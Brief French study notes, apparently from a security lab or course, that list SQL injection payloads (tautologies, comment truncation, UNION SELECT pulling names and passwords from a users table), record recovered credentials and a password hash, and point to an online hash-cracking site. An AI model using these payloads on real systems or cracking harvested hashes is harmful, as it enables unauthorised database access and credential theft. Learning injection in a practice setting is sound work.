# en début de semaine 

```sql
SELECT * FROM user WHERE id = '1' OR 1=1 # '

-- je veux récupérer 1 profil utilisateur dans la base de données qui est dans la table user 
SELECT * FROM user WHERE id = '1' OR 1=1  UNION SELECT 1, 2, 3; 
SELECT * FROM user WHERE id = '1' OR '1'='1'  UNION SELECT 1, 2, 3; 
SELECT * FROM user WHERE id = '1' OR '1'='1'  UNION SELECT 1, 2, 3 #  


  1' OR '1'='1'  UNION SELECT 1, 2 # 
  1' OR '1'='1'  UNION SELECT first_name, password AS last_name FROM users # 

```

Pablo / barbados

maintenant on a login Gordon et son mot de passe qui est haché `575e22bc356137a41abdef379b776dba` => thor
575e22bc356137a41abdef379b776dba

=> comment le mettre en clair => site crackstation => https://crackstation.net/